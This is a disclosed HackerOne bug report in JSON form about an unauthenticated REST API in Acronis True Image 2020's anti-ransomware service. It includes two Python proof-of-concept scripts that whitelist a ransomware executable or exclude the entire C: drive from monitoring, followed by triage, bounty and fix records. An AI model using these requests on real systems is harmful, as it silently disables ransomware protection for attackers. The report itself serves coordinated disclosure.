{"id":858608,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTg2MDg=","url":"https://hackerone.com/reports/858608","title":"anti_ransomware_service.exe REST API does not require authentication","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-04-24T11:41:13.411Z","submitted_at":"2020-04-24T11:41:13.411Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mjoensen","url":"/mjoensen","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13428,"url":"https://hackerone.com/acronis","handle":"acronis","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Acronis","twitter_handle":"Acronis","website":"https://www.acronis.com","about":"Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-06-24T08:20:51.161Z","bug_reporter_agreed_on_going_public_at":"2021-06-24T08:20:51.037Z","team_member_agreed_on_going_public_at":"2021-06-22T06:36:38.266Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"anti_ransomware_service.exe exposes a REST API that can be used by everyone, even unprivileged users. This API is used to communicate from the Acronis True Image 2020 GUI to the anti_ransomware_service.exe. This can be exploited to add an arbitary malicious executable to the whitelist or even exclude the entire drive from being monitored by anti_ransomware_service.exe.\n\nAdd executable to whitelist, steps to reproduce:\n1. Run the python script \"add_executable_to_whitelist.py\". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.\n2. Verify in the Acronis True Image 2020 GUI that the executable \"C:\\ProgramData\\ransomware_exe.exe\" is whitelisted.\n\nadd_executable_to_whitelist.py:\n\"\"\"\nimport requests\nimport json\n\nput_headers = {'User-Agent': 'AcronisRestClient', \"Accept\": \"application/json\",\n    \"Content-Type\":\"application/json\"}\n\ndata = {\n   \"additions\" : [\n      {\n         \"path\" : \"C:\\\\ProgramData\\\\ransomware_exe.exe\"\n      }\n   ],\n   \"removals\" : []\n}\nr1 = requests.put('http://localhost:6109/lists/processImages/white', headers=put_headers, data=json.dumps(data))\nprint(r1.content)\n\"\"\"\n\nExclude drive from monitoring, steps to reproduce:\n1. Run the python script \"exclude_drive_from_anti_ransomware.py\". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.\n2. Verify in the Acronis True Image 2020 GUI that the path \"C:\\*\" is excluded.\n\nexclude_drive_from_anti_ransomware.py:\n\"\"\"\nimport requests\nimport json\nimport time\n\nput_headers = {'User-Agent': 'AcronisRestClient', \"Accept\": \"application/json\",\n    \"Content-Type\":\"application/json\"}\n\ndata = {\n   \"additions\" : [\n      {\n         \"path\" : \"C:\\\\*\"\n      }\n   ],\n   \"removals\" : []\n}\nr1 = requests.put('http://localhost:6109/lists/excludes', headers=put_headers, data=json.dumps(data))\nprint(r1.content)\n\"\"\"\n\n## Impact\n\nThis could silently disable the anti_ransomware_service.exe by whitelisting the specific ransomware executable or excluding the entire system drive from inspection.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":147,"name":"Missing Authentication for Critical Function"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":15,"voters":["mr-medi","xsky","3x3s","h4x0r_dz","cryptographer","scarryknight7","ekgaribadmi","sohagpk","halilcanc_04","ac1dm4n14c","and 5 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"high"}},"structured_scope":{"databaseId":50772,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Acronis Cyber Protect Home Office (formerly Acronis True Image)","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7784664,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-04-24T15:25:34.930Z","updated_at":"2020-04-24T15:25:34.930Z","additional_data":{"old_title":"Denial of Service/Bypass in anti_ransomware_service.exe","new_title":"anti_ransomware_service.exe REST API does not require authentication"},"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7784705,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi, @mjoensen. Thanks for your efforts!","automated_response":false,"created_at":"2020-04-24T15:29:04.592Z","updated_at":"2020-04-24T15:29:04.592Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7820345,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-04-28T08:24:24.598Z","updated_at":"2020-04-28T08:24:24.598Z","actor":{"url":"/acronis","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Acronis"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"acronis","collaborator":{"username":"mjoensen","url":"/mjoensen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7833439,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-04-29T08:21:57.479Z","updated_at":"2020-04-29T08:21:57.479Z","additional_data":{"added_weaknesses":[{"id":147,"name":"Missing Authentication for Critical Function"}],"removed_weaknesses":[{"id":48,"name":"Denial of Service"}]},"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8584138,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-07-13T15:11:41.403Z","updated_at":"2020-07-13T15:11:41.403Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Mobile applications","new_scope":"Acronis Agent","genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8785456,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-07-28T20:31:54.820Z","updated_at":"2020-07-28T20:31:54.820Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Acronis Agent","new_scope":"Acronis Cyber Protect Home Office (formerly Acronis True Image)","genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9933727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @mjoensen,\n\nAs we discussed, this issue was fixed in Acronis True Image 2021 U2. Please confirm that you are no longer able to reproduce the issue. You can request a trial [here](https://www.acronis.com/en-eu/homecomputing/thanks/acronis-true-image-2021/). We also mentioned you in the release notes: https://www.acronis.com/en-us/support/updates/changes.html?p=41682.\n\nOne note regarding vulnerability details disclosure. Since in this case we're not managing vulnerable installations, we're asking for a standard 90 days remediation time, meaning that disclosure date is February 23, 2021. This is required, so that as many customers as possible would get an update.\nWe would highly appreciate if you could share a draft version of the blog post when it is ready so that we could proof-read it and answer your questions, if any.","automated_response":false,"created_at":"2020-11-26T12:12:01.106Z","updated_at":"2020-11-26T12:12:01.106Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9933744,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for catching this bug!\n\nWe have fixed it, please confirm that you are no longer able to reproduce the issue.\n","automated_response":false,"created_at":"2020-11-26T12:14:36.534Z","updated_at":"2020-11-26T12:14:36.534Z","actor":{"username":"security-bot","cleared":false,"url":"/security-bot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/u1v6ebFa8hVxpyhbpJYAM4YY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mjoensen","url":"/mjoensen"},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10721471,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mjoensen,\n\nOur development team faced some technical issues trying to fix this vulnerability in other Acronis True Image builds. We kindly ask you to postpone disclosure of any vulnerability details until the end of March. Please let us know if you have any objections. ","automated_response":false,"created_at":"2021-02-19T15:48:28.255Z","updated_at":"2021-02-19T15:48:28.255Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12201506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-22T06:36:38.291Z","updated_at":"2021-06-22T06:36:38.291Z","first_to_agree":true,"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12228870,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-24T08:20:51.094Z","updated_at":"2021-06-24T08:20:51.094Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12228871,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-24T08:20:51.232Z","updated_at":"2021-06-24T08:20:51.232Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}